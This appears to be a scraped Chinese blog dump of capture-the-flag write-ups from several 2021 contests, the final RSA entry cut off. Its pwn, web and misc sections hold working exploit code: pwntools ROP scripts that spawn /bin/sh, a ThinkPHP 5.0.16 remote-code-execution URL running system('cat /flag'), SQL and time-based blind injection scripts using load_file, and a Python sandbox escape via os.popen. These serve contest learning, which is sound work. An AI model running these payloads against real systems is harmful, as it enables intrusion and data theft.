ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c Diffie-Hellman密钥交换，已知生成元 $g$、模数 $p$ 和AB根据40位随机数 $a,b$ 生成的各自的数 $A=g^a \\pmod p,B=g^b \\pmod p$，求共享密钥 $K=g^{ab} \\pmod p$。 $a,b$ 都为40位比较小，可以采用lambda算法解离散对数，解出 $a$ 或 $b$ 即可计算 $K$： 12345678910111213141516# Sagep = 174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544)k = GF(p)B = k(B)g = k(g)b = discrete_log_lambda(B,g,(1,2**40))ciphertext = &#x27;ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c&#x27;key = pow(A, b ,p)key = long_to_bytes(key)[:16]cipher = AES.new(key, AES.MODE_ECB)m = cipher.decrypt(bytes.fromhex(ciphertext))print(m)# b&#x27;flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;\\x06\\x06\\x06\\x06\\x06\\x06&#x27; flag：flag&#123;21384433-0dc7-413b-9d09-64cc97c99730&#125;。 ​ WEB[签到] flag http://47.106.172.144:65333/ 页面不断随机输出flag各位置对应字符，复制，脚本填充： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748flag=[&#x27;?&#x27;]*20flag[11]=&#x27;f&#x27;flag[16]=&#x27;a&#x27;flag[19]=&#x27;9&#x27;flag[10]=&#x27;N&#x27;flag[5]=&#x27;3&#x27;flag[15]=&#x27;n&#x27;flag[16]=&#x27;a&#x27;flag[4]=&#x27;Z&#x27;flag[8]=&#x27;c&#x27;flag[4]=&#x27;Z&#x27;flag[17]=&#x27;W&#x27;flag[11]=&#x27;f&#x27;flag[2]=&#x27;x&#x27;flag[7]=&#x27;u&#x27;flag[9]=&#x27;3&#x27;flag[8]=&#x27;c&#x27;flag[17]=&#x27;W&#x27;flag[11]=&#x27;f&#x27;flag[9]=&#x27;3&#x27;flag[13]=&#x27;G&#x27;flag[11]=&#x27;f&#x27;flag[0]=&#x27;Z&#x27;flag[0]=&#x27;Z&#x27;flag[10]=&#x27;N&#x27;flag[12]=&#x27;b&#x27;flag[1]=&#x27;m&#x27;flag[0]=&#x27;Z&#x27;flag[14]=&#x27;9&#x27;flag[1]=&#x27;m&#x27;flag[0]=&#x27;Z&#x27;flag[16]=&#x27;a&#x27;flag[14]=&#x27;9&#x27;flag[16]=&#x27;a&#x27;flag[13]=&#x27;G&#x27;flag[3]=&#x27;h&#x27;flag[12]=&#x27;b&#x27;flag[11]=&#x27;f&#x27;flag[12]=&#x27;b&#x27;flag[15]=&#x27;n&#x27;flag[3]=&#x27;h&#x27;flag[9]=&#x27;3&#x27;flag[17]=&#x27;W&#x27;flag[5]=&#x27;3&#x27;flag[6]=&#x27;t&#x27;flag[18]=&#x27;5&#x27;print(&#x27;&#x27;.join(flag))# ZmxhZ3tuc3NfbG9naW59 base64解码得flag：flag&#123;nss_login&#125;。 ​ REVERSE[签到]signin 逆向 真 签到题 010editor 16进制查看，搜索出flag：flag&#123;REVERSE_1s_Very_3asy!&#125;。 ​ [萌新]happyCTFIDA反编译，发现去了符号，分析代码逻辑，需输入长度24的flag字符串，经 sub_403B70() 函数里逐字符异或0x14后，与字符串 rxusoCqxw&#123;yqK`&#123;KZqag&#123;r`i 比较，相等则通过。 按异或性质，将字符串与0x14逐字符异或还原flag：flag&#123;Welcome_to_Neusoft&#125;。 ​ Remember Crypt 4从题目就能猜出是RC4，main() 函数代码： 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax unsigned int v4; // eax void *v5; // rax void *v7; // rax int i; // [rsp+24h] [rbp-D4h] void *v9; // [rsp+28h] [rbp-D0h] char v10[32]; // [rsp+30h] [rbp-C8h] BYREF char Str[128]; // [rsp+50h] [rbp-A8h] BYREF strcpy(Str, &quot;12345678abcdefghijklmnopqrspxyz&quot;); memset(&amp;Str[32], 0, 0x60ui64); memset(v10, 0, 0x17ui64); sub_1400054D0(&quot;%s&quot;, v10); v9 = malloc(0x408ui64); v3 = strlen(Str); sub_140001120(v9, Str, v3); v4 = strlen(v10); sub_140001240(v9, v10, v4); for ( i = 0; i &lt; 22; ++i ) &#123; if ( ((unsigned __int8)v10[i] ^ 0x22) != byte_14013B000[i] ) &#123; v5 = (void *)sub_1400015A0(&amp;off_14013B020, &quot;error&quot;); _CallMemberFunction0(v5, sub_140001F10); return 0; &#125; &#125; v7 = (void *)sub_1400015A0(&amp;off_14013B020, &quot;nice job&quot;); _CallMemberFunction0(v7, sub_140001F10); return 0;&#125; 整体逻辑为，输入字符串经过 sub_140001120() 和 sub_140001240() 函数处理后，与0x22异或，与 byte_14013B000 数组比较。看两函数特征，分别为RC4算法的KSA和PRGA函数，key为 12345678abcdefghijklmnopqrspxyz。 IDA提取数组hex值：9EE7305FA701A653591B0A20F173D10EAB09840E8D2B0000，Cyberchef FromHex+XOR+RC4一把梭，得到flag：flag&#123;nice_to_meet_you&#125;。 ​ PWN[签到]NssShop nc 47.106.172.144 65002 真 签到题 不会PWN的同学也可以来试试 nc连接，当前金额为0，选择 1.Buy Item， 看到flag价格10000，hint价格0，选择 1.Hint:0$， 回显 Unlimited purchase of items in the shop，说明数量无上限。 利用int型溢出性质，使得flag单价与数量乘积的总价上溢为负数即可。 选择 0.Flag:10000$，输入数量111111111，得到flag：flag&#123;Pwn_Is_Vary_Ez&#125;。 justdoit nc 47.106.172.144 65004 IDA分析，main() 函数代码： 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); printf(&quot;Hi there! What is your name? &quot;); read(0, buf, 0x18uLL); puts(&quot;That is an interesting chall&quot;); printf(&quot;where are you from? my frends??&quot;); read_long(); return 0;&#125; read_long() 函数： 1234567__int64 read_long()&#123; char buf[32]; // [rsp+0h] [rbp-20h] BYREF read(0, buf, 0x13uLL); return atol(buf);&#125; 从代码看不出有什么利用之处，切换回汇编视图，发现 read_long() 函数在返回rax值时，rbp存在一个加操作： 123456789101112131415161718192021222324252627282930313233343536.text:00000000004011D5 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00000000004011D5 public main.text:00000000004011D5 main proc near ; DATA XREF: _start+21↑o.text:00000000004011D5.text:00000000004011D5 buf = byte ptr -20h.text:00000000004011D5.text:00000000004011D5 ; __unwind &#123;.text:00000000004011D5 push rbp.text:00000000004011D6 mov rbp, rsp.text:00000000004011D9 sub rsp, 20h.text:00000000004011DD mov eax, 0.text:00000000004011E2 call init.text:00000000004011E7 lea rax, format ; &quot;Hi there! What is your name? &quot;.text:00000000004011EE mov rdi, rax ; format.text:00000000004011F1 mov eax, 0.text:00000000004011F6 call _printf.text:00000000004011FB lea rax, [rbp+buf].text:00000000004011FF mov edx, 18h ; nbytes.text:0000000000401204 mov rsi, rax ; buf.text:0000000000401207 mov edi, 0 ; fd.text:000000000040120C call _read.text:0000000000401211 lea rax, s ; &quot;That is an interesting chall&quot;.text:0000000000401218 mov rdi, rax ; s.text:000000000040121B call _puts.text:0000000000401220 lea rax, aWhereAreYouFro ; &quot;where are you from? my frends??&quot;.text:0000000000401227 mov rdi, rax ; format.text:000000000040122A mov eax, 0.text:000000000040122F call _printf.text:0000000000401234 mov eax, 0.text:0000000000401239 call read_long.text:000000000040123E add rbp, rax ; 加操作.text:0000000000401241 mov eax, 0.text:0000000000401246 leave.text:0000000000401247 retn.text:0000000000401247 ; &#125; // starts at 4011D5.text:0000000000401247 main endp 接着的 leave 是 mov rsp,rbp; pop rbp，rsp将变为rbp+rax，控制rax为-0x20-8，结合 leave 操作可以将rsp移动到 buf 处以写入ROP链。 12345678910111213141516171819202122232425262728293031323334353637from pwn import *binary = context.binary = ELF(&#x27;./justdoit.1&#x27;)p = remote(&#x27;47.106.172.144&#x27;, 65004)libc = ELF(&#x27;./libc-2.23.so&#x27;)pop_rdi = binary.search(asm(&#x27;pop rdi; ret;&#x27;)).__next__()pop2 = binary.search(asm(&#x27;pop r14; pop r15; ret;&#x27;)).__next__()payload = b&#x27;&#x27;payload += p64(binary.sym.main)payload += p64(binary.plt.puts)payload += p64(binary.sym.main)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)payload = b&#x27;&#x27;payload += p64(pop_rdi)payload += p64(binary.got.puts)payload += p64(pop2)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)libc.address = u64(p.recv(6) + b&#x27;\\0\\0&#x27;) - libc.sym.putslog.info(&#x27;libc.address: &#x27; + hex(libc.address))payload = b&#x27;&#x27;payload += p64(pop_rdi)payload += p64(libc.search(b&#x27;/bin/sh&#x27;).__next__())payload += p64(libc.sym.system)p.sendafter(b&#x27;name? &#x27;, payload)p.sendafter(b&#x27;frends??&#x27;, b&#x27;-40&#x27;)p.interactive() flag：ctf&#123;01241e36-ea17-4bed-b620-f64f10e5c192&#125;。 ​ reallNeedGoodLuck nc 47.106.172.144 65003 IDA分析，main() 函数代码： 123456789101112131415161718int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; _DWORD *v3; // [rsp+0h] [rbp-30h] int buf; // [rsp+Ch] [rbp-24h] BYREF char nptr[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); init(argc, argv, envp); puts(&quot;need&quot;); puts(&quot;good&quot;); read(0, &amp;buf, 4uLL); puts(&quot;luck! &quot;); read(0, nptr, 9uLL); v3 = (_DWORD *)atoi(nptr); *v3 = buf; exit(0);&#125; buf 和 nptr 都无溢出点，但可以向 buf 写入4字节并覆盖掉写入nptr中值对应地址的内容。 可以任意地址写，考虑将 atoi 改为libc中的 system，再向 system 传入 /bin/sh\\x00 即可getshell，为达成两步利用，还需将 exit 改为 main 地址。 atoi 与system 的偏移只有最后2字节不同，又由于ASLR开启，后1.5字节为0，所以有0.5/8=1/16的几率能将 atoi 改为 system。 12345678910111213141516171819202122232425262728293031323334353637from pwn import *binary = context.binary = ELF(&#x27;./reallNeedGoodLuck.1&#x27;)context.log_level = &#x27;WARN&#x27;attempt = 0while True: try: p = remote(&#x27;47.106.172.144&#x27;, 65003) libc = ELF(&#x27;./libc-2.23.so&#x27;) tout = 1.0 attempt += 1 log.warn(&#x27;attempt: &#x27; + str(attempt)) p.sendafter(b&#x27;good\\n&#x27;,p32(binary.sym.main)) p.sendafter(b&#x27;luck! \\n&#x27;,str(binary.got.exit).encode()) p.sendafter(b&#x27;good\\n&#x27;,p32(((libc.sym.system | 0xf000) &amp; 0xffff) &lt;&lt; 16)) p.sendafter(b&#x27;luck! \\n&#x27;,str(binary.got.atoi - 2).encode()) p.sendafter(b&#x27;good\\n&#x27;,b&#x27;0000&#x27;,timeout=tout) p.sendafter(b&#x27;luck! \\n&#x27;,b&#x27;/bin/sh\\x00&#x27;,timeout=tout) p.sendline(b&#x27;echo test&#x27;) if b&#x27;test&#x27; in p.recvline(timeout=tout): p.interactive() break except AssertionError as err: print(err) sys.exit(1) except: try: p.close() except: continue flag：ctf&#123;8b1bf41f-8b38-4487-86ae-a5df4fa4c85e&#125;。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NCTF 2021","slug":"match-NCTF-2021","date":"2021-11-28T12:53:29.000Z","updated":"2021-11-28T19:29:51.642Z","comments":true,"path":"2021/11/28/match-NCTF-2021/","link":"","permalink":"https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/","excerpt":"","text":"​ 比赛时间：2021.11.27 9:00-2021.11.28 21:00 比赛区分校内校外，比赛结束后结算分别排名，比赛时排行榜不区分 注册队伍登陆后，请在Profile页面绑定队伍成员信息 每支队伍至少绑定一个成员，不超过4人，校内队伍所有成员请填写真实姓名和正确学号，校外队伍至少绑定一个成员，以便颁奖时联系。 未绑定成员信息的队伍可以正常解题但不参与排名 成员信息一经绑定不可更改 禁止对平台进行攻击 禁止与其他队伍交流解题思路 请在比赛结束后12小时内发送详细解题思路（pdf格式）到邮箱nctf@h4ck.fun Rank: 10 MISCSignin find it 签到，https://nctf.h4ck.fun/challenges/NCTF%7BWelcome_to_NCTF_2021!%7D，链接就有flag：NCTF&#123;Welcome_to_NCTF_2021!&#125;。 ​ Hex酱的秘密花园 我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~但是为了防止有些居心叵测的人，我们专门 把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~Ubuntu Python3.6.9快去找Hex酱(QQ:2821876761)私聊吧私聊发送的信息为明文，不需要加base64 1234567891011121314import sysfrom base64 import b64decodecode = sys.argv[1]try: data = b64decode(code.encode()).decode()except: exit(0)for c in &#x27;h&quot;\\&#x27;(&#x27;: if c in data: exit(0)exec(data) 挺有趣的结合了QQBot的python逃逸，由代码知需传入python代码段，不能包含括号、单双引号和字母h，最后exec 函数执行。 断掉了 print() 和 help() 输出方式，可以采用python中的语法糖 @ 类装饰器，在创建类时触发装饰器中的代码逻辑： 12345678910x=95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,104,111,109,101,47,102,108,97,103,39,41,46,114,101,97,100,40,41y=lambda z:x@print@eval@bytes@yclass z: pass#__import__(&#x27;os&#x27;).popen(&#x27;cat /home/flag&#x27;).read() Bot返回flag：NCTF&#123;HexQBot_1s_s0_cut3~&#125;。 ​ 做题做累了来玩玩游戏吧 做了一天的题目，都累了吧，快来玩玩我新写的飞机大战吧，只要通关就能获得flag哟～对了，如果你真的想玩游戏，也许你需要一个mac，Intel和Apple silicon芯片都支持 Unity3D 游戏，主逻辑都在 Assembly-CSarp.dll 中，找到文件： PlaneFire.app/Contents/Resources/Data/Managed/Assembly-CSharp.dll 用ILSpy查看dll程序逻辑，发现最终通过访问 http://h4ck.fun/g4me.txt 获取flag：NCTF&#123;B9F3C1F2-1E65-481C-8AF3-A78FA7A5EB6A&#125;。 ​ 问卷题 问卷链接：https://forms.gle/RcKhJo2uQwQrL4Gu9提示：是Google问卷 签退，答完就有flag：NCTF&#123;Thank_y0u_for_your_participation&#125;。 ​ CRYPTOdsa flag格式nctf{.*}，题目见附件 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.Util.number import *from secret import flagfrom hashlib import sha256import osdef keygen(): while True: p = getPrime(522) q = p//2 if isPrime(q): break g = 3 h = long_to_bytes(getPrime(256)) x = int.from_bytes(h*2, &quot;big&quot;) y = pow(g, x, p) return g, p, q, y, xdef sign(h, x): k = sha256(h.encode().hex().encode()).digest()+sha256(bytes.fromhex(h)+x.to_bytes(128, &quot;big&quot;)).digest() k = int.from_bytes(k, &quot;big&quot;) r = pow(g,k,p) s = (r*x+int(h,16))*inverse(k,q)%q return r, sg, p, q, y, x = keygen()flag = int(flag[5:-1],16)^int(sha256(x.to_bytes(128, &quot;big&quot;)).hexdigest(),16)r, s = sign(hex(flag)[2:], x)print(q)print(y)print(flag)print(r)print(s)&#x27;&#x27;&#x27;40650743302059808774634634244068138501542753026953617483148703464113290519480444509529050631824834777584951166961649968888463087750447378168090155240888982037743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636194805921925438811312671673280199412771068954692916912073818129050333067669919624330046071533920997153227932488842182641815380056666599058512474681029599566250988315160467154466151984370050361176857929057367882169873785845130202154421861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777&#x27;&#x27;&#x27; DSA签名算法，将明文 $m$ 与私钥 $x$ 哈希值 $h(x)$ 的异或值 $H=m \\oplus h(x)$ 传入sign() 函数，并将 $H$ 与 $h(H+x)$ 连接得到的 $k$ 作为临时密钥，计算 $r=g^k \\bmod p$ 和 $s=(rx+H)k^{-1} \\bmod q$，给出签名结果 $(r,s)$，求私钥 $x$。 已知 $g,q,p=2q+1,y,H,r,s$，$x$ 为512位，根据 x = int.from_bytes(h*2, &quot;big&quot;) 可知 $x \\mid (2^{256}+1)$，设 $x=(2^{256}+1)d’$，则 $d’$ 也是256位。 $k$ 由 $H$ 与 $h(H+x)$ 连接得到，$H$ 已知，即 $k$ 的高256位已知，低256位未知，设 $k=2^{256}H+h’$。 根据 $s=(rx+H)k^{-1} \\bmod q$，有： $(2^{256}H+h’)s-(2^{256}+1)d’r-H \\equiv 0 \\pmod q$ 利用coppersmith定理构造格，通过LLL算法计算 $(h’,d’)$，这里采用small_roots脚本攻击： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# Sageimport itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []q=4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203g=3y=7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636h=19480592192543881131267167328019941277106895469291691207381812905033306766991r=962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442s=1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777p=2*q+1from hashlib import sha256import gmpy2kmax=int(sha256(hex(h)[2:].encode().hex().encode()).digest().hex(),16)PR.&lt;h_, d_&gt; = PolynomialRing(Zmod(q))f = (2^256 * kmax + h_) * s - (2^256 + 1) * d_ * r - hroots = small_roots(f, [2^256, 2^256], d=4, m=4)print(roots)for root in roots: kmin = Integer(root[0]) k = (2^256 * kmax + kmin) x_ = Integer(root[1]) x_ = (2^256 + 1) * x_ if pow(g, x_, p) == y: print(&quot;[+] found: &#123;&#125;&quot;.format(x_)) break else: print(&quot;[-] wrong: &#123;&#125;&quot;.format(x_))print(x_)flag = hex(int(sha256(int(x_).to_bytes(128, &quot;big&quot;)).hexdigest(),16) ^^ h)[2:]print(flag)# 1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110 加上外壳，flag：nctf&#123;1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110&#125;。 ​ WEBezsql 这还能注入吗 Hint 1: 另一半flag在数据库中 www.zip 中三个文件 config.php、DB.php、login.php。 login.php 中主逻辑： 12345678910111213141516171819202122&lt;?phpif (isset($_POST[&#x27;password&#x27;]))&#123; $query = db::prepare(&quot;SELECT * FROM `users` where password=md5(%s)&quot;, $_POST[&#x27;password&#x27;]); // (1) if (isset($_POST[&#x27;name&#x27;]))&#123; $query = db::prepare($query . &quot; and name=%s&quot;, $_POST[&#x27;name&#x27;]); // (2) &#125; else&#123; $query = $query . &quot; and name=&#x27;benjaminEngel&#x27;&quot;; &#125; $query = $query . &quot; limit 1&quot;; $result = db::commit($query); if ($result-&gt;num_rows &gt; 0)&#123; die(&#x27;NCTF&#123;ez&#x27;); &#125; else&#123; die(&#x27;Wrong name or password.&#x27;); &#125;&#125;... 使用 db::prepare 预处理sql语句。 跟进 DB.php 看 prepare() 函数的定义： 123456789101112131415161718192021222324252627282930313233343536public static function prepare($query, $args)&#123; if (is_null($query))&#123; return; &#125; if (strpos($query, &#x27;%&#x27;) === false)&#123; die(&#x27;%s not included in query!&#x27;); return; &#125; // get args $args = func_get_args(); array_shift( $args ); $args_is_array = false; if (is_array($args[0]) &amp;&amp; count($args) == 1 ) &#123; // (3) $args = $args[0]; $args_is_array = true; &#125; $count_format = substr_count($query, &#x27;%s&#x27;); if($count_format !== count($args))&#123; // (4) die(&#x27;Wrong number of arguments!&#x27;); return; &#125; // escape foreach ($args as &amp;$value)&#123; $value = static::$db-&gt;real_escape_string($value); // (5) &#125; // prepare $query = str_replace(&quot;%s&quot;, &quot;&#x27;%s&#x27;&quot;, $query); // (6) $query = vsprintf($query, $args); // (7) return $query;&#125; (3)处 prepare() 函数接收的 $args 为数组，(4)处 判断接收参数数量和 %s 数量是否一致，(5)处转义特殊字符，(6)处给 %s 匹配的参数值加单引号，(7)处替换 $query 中对应的 %s 为参数值。 在(1)的password和(2)的name处都使用了格式化字符串 %s，可以在(1)处传入 %s 干扰匹配，并在(2)处传入数组匹配两处 %s： password=%s，name[0]=) or 1=1 --，name[1]=x sql语句由 SELECT * FROM `users` where password=md5(%s) and name=%s limit 1 变为 SELECT * FROM `users` where password=md5() or 1=1 -- ) and name=x limit 1，实现注入。 POST传参读到前半部分flag：NCTF&#123;3v3ryth1ng_。 把 or 1=1 替换为布尔盲注if语句即可拿到后半部分flag： 12345678910111213141516171819202122232425262728293031323334353637import requestsurl = &quot;http://129.211.173.64:3080/login.php&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; payload = f&#x27;if(ascii(substr((select(group_concat(`fl@g`))from(`2021`.NcTF)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; data = &#123; &#x27;password&#x27;: &#x27;%s&#x27;, &#x27;name[0]&#x27;: f&quot;) or &#123;payload&#125; -- &quot;, &#x27;name[1]&#x27;: &#x27;s&#x27; &#125; # r = requests.get(url,params=data) r = requests.post(url,data=data) if &quot;NCTF&#123;3v3ryth1ng_&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) # not_fantast1c_:)&#125; 合并，flag：NCTF&#123;3v3ryth1ng_not_fantast1c_:)&#125; ​ 摆就完事了 啊对对对 太对辣太对辣If you get no idea about the problem,there is no harm in diffing the source code with the official one. 观察url结构 /public/index.php/index/index/index，疑似ThinkPHP路径，随便改写报错知为ThinkPHP V5.0.16。 尝试未开启强制路由RCE漏洞，加后缀： http://129.211.173.64:8085/public/index.php/index/index/index?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt; 出现phpinfo页，改成 &lt;?php%20system(&quot;cat /flag&quot;);?&gt; 拿到flag：nctf&#123;m1saka_wanna_kaibai&#125;。 ​ 摆就完事了2.0 卷起来 不准摆！ 版本同上，改了逻辑，未开启强制路由RCE漏洞无效。 www.zip 下载源码，发现控制器 applicaion/index/controller/M1sakaM1yuu.php： 123456789101112131415161718192021222324252627282930&lt;?php /* * @Author: m1saka@x1ct34m * @blog: www.m1saka.love */namespace app\\index\\controller;function waf($str)&#123; if(preg_match(&quot;/system| |\\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i&quot;, $str))&#123; return true; &#125;&#125;class M1sakaM1yuu&#123; public function index() &#123; $username = request()-&gt;get(&#x27;username/a&#x27;); $str = implode(&#x27;,&#x27;,$username); if (waf($str)) &#123; return &#x27;&lt;img src=&quot;http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg&quot; alt=&quot;hutao&quot; /&gt;&#x27;; &#125; if($username)&#123; db(&#x27;m1saka&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); return &#x27;啊对对对&#x27;; &#125; else &#123; return &#x27;说什么我就开摆&#x27;;// &#125; &#125;&#125; 按照ThinkPHP控制器语法，GET方式传入 username 参数值（本地部署，开启debug调试功能测试）： http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username=xxx 正常回显 啊对对对。 后续控制 username 参数值，绕过waf，实现insert注入： http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=if((substr((select(&quot;admin&quot;)),16,1)=&quot;n&quot;),sleep(3),0) 替换为时间盲注： 123456789101112131415161718192021222324252627import requestsurl = &quot;http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=&quot;result = &#x27;&#x27;i = 15while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 payload = f&#x27;if((ascii(substr((select(load_file(&quot;/var/www/html/ffllaagg.php&quot;))),&#123;i&#125;,1))&gt;&#123;mid&#125;),sleep(0.6),0)&#x27; try: r = requests.get(url + payload,timeout=0.5) tail = mid except: head = mid + 1 if head != 32: result += chr(head) else: break print(result) 得到flag：nctf&#123;m1saka_wanna_marry_liyuu_&#125;。 ​ REVERSEHello せかい 欢迎来到NCTF-逆向工程(Reverse Engineering)这里可能有你需要的工具:ida pro 7.6 :链接：https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg 提取码：o49x IDA打开，查找字符串，发现flag：NCTF&#123;We1come_2_Reverse_Engineering&#125;。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2021年中国能源网络安全大赛","slug":"match-2021年中国能源网络安全大赛","date":"2021-10-15T11:39:32.000Z","updated":"2021-10-16T16:00:36.995Z","comments":true,"path":"2021/10/15/match-2021年中国能源网络安全大赛/","link":"","permalink":"https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 能源网络安全是国家实施能源安全战略的重要保障。在国家“碳达峰、碳中和”战略目标引领下，以新能源为主体的新型电力系统正加快建设，能源企业数字化转型加速发展，我国能源网络安全风险挑战仍将持续增大。为深入贯彻习近平总书记关于切实做好国家关键信息基础设施安全防护的重要指示精神，落实《关键信息基础设施安全保护条例》的有关要求，全面提升我国能源行业网络安全水平，加强能源网络安全人才培养与技术交流，加快构建“清洁低碳、安全高效”的能源体系，中国能源研究会定于2021年9～11月举办2021年中国能源网络安全大赛暨中国能源网络与数据安全大会。 CRYPTORSA 123456e1=835967807536519622934604405063c1=19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710n1=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863e2=885003184250422219085124964981c2=4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400n2=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150